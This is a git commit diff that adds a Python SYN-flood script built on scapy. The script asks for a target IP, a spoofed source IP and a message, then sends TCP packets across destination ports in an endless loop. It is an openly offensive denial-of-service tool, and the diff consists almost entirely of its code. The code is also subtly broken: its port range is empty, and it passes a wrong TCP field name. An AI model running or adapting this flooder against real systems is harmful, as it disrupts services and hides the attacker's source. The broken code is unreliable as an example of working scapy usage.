af40d26889c1cd9ab657f28a5c4f567e3803e025
Patrick McCabe <patrick.j.mccabe5@gmail.com>
2020-04-02 12:31:02 -0400

    Syn flooder

--- Python-Tools/Sniffers-Flooders-Spoofers/syn-flood.py
+++ Python-Tools/Sniffers-Flooders-Spoofers/syn-flood.py
@@ -1,12 +1,23 @@
 #!/usr/bin/env python3
-from scapy import *
+from scapy.all import *
 
-def synFlood():
+def synFlood(src, tgt, msg):
 
+    for dport in range(1024-65535):
+        ipLayer = IP(src = src, dst = tgt)
+        tcpLayer = TCP(src = 4444, dport = dport)
+        rawLayer = Raw(load = msg)
+        packet = ipLayer / tcpLayer / rawLayer
+        send(packet)
 
 def main():
 
+    target = input('Enter a target IP: ')
+    source = input('Enter a source IP: ')
+    message = input('Enter a message: ')
 
+    while True:
+            synFlood(source, target, message)
 
 main()
     
